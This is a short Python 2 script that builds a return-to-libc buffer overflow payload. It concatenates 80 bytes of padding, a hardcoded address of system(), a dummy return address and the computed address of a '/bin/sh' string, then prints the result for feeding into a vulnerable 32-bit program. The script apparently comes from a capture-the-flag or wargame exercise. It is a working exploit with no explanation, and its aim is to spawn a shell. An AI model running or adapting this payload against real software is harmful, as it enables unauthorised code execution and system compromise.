import struct
padding = "A" * 80
system = struct.pack("I",0xb7ecffb0)
ret = "AAAA"
binsh = struct.pack("I",0xb7e97000 + 0x11f3bf)
exploit = padding + system + ret + binsh
print exploit
